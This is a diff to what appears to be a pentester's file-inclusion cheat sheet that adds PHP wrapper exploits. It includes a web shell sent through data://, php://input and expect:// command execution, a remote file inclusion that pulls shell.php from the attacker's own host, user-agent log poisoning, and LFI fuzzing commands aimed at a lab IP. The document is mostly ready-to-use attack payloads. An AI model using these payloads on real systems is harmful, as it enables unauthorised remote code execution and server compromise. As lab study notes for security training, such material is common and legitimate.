@@ -1640,6 +1640,8 @@ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.bas
 echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
 ```
 
+======================= PHP Wrappers ==============================================
+
 ### Data Wrapper
 ```bash
 echo '<?php system($_GET["cmd"]); ?>' | base64
@@ -1652,7 +1654,21 @@ index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7
 curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
             uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
-======================= log poisoning ===========================================================================
+
+### Expect Wrapper
+```bash
+curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
+```
+
+======================= Remote File Inclusion =====================================
+
+## Remote File Inclusion
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
+```
+
+======================= log poisoning =============================================
 
 ### PHP Session Poisoning
 PHPSESSID from inspect->storage->cookies
@@ -1695,7 +1711,7 @@ C:\nginx\log\
 curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
 ```
 
-======================= Automated scanning =========================================================================
+======================= Automated scanning =================================================
 
 ### Fuzzing Parameters
 ```bash
@@ -1746,9 +1762,6 @@ wfuzz -c --sc 200,301 -w /usr/share/wordlists/seclists/Discovery/Web-Content/com
 ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt -u http://192.168.190.53:8080/site/index.php?page=FUZZ
 ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt -u http://192.168.190.53:8080/site/index.php?page=FUZZ -fl 5
 ```
-
-## Remote File Inclusion
-- ?page=http://192.168.45.208
 
 ## PHP File Upload Bypass
 ```bash
